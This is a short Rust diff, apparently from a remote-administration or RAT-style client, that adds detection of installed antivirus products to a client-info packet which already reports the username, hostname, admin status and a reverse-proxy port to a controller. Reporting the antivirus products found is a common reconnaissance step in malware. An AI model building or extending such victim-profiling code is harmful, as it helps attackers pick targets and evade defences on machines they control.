@@ -17,7 +17,7 @@ use winapi::shared::minwindef::{ BOOL, LPARAM };
 use winapi::Interface;
 
 use crate::service::install::is_elevated;
-
+use crate::features::av_detection::get_installed_avs;
 use common::packets::{MessageBoxData, VisitWebsiteData, ClientInfo};
 
 pub fn client_info(group: String) -> ClientInfo{
@@ -79,7 +79,11 @@ pub fn client_info(group: String) -> ClientInfo{
     std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
     s.refresh_cpu();
 
+    let installed_avs = get_installed_avs();
+
     let client_data = ClientInfo {
+        uuidv4: None,
+        addr: None,
         group,
         username: std::env::var("username").unwrap_or_else(|_| "__UNKNOWN__".to_string()),
         hostname: System::host_name().unwrap().to_string(),
@@ -91,6 +95,8 @@ pub fn client_info(group: String) -> ClientInfo{
         displays: display_count,
         is_elevated: is_elevated(),
         reverse_proxy_port: "".to_string(),
+        installed_avs,
+        disconnected: None,
     };
 
     client_data
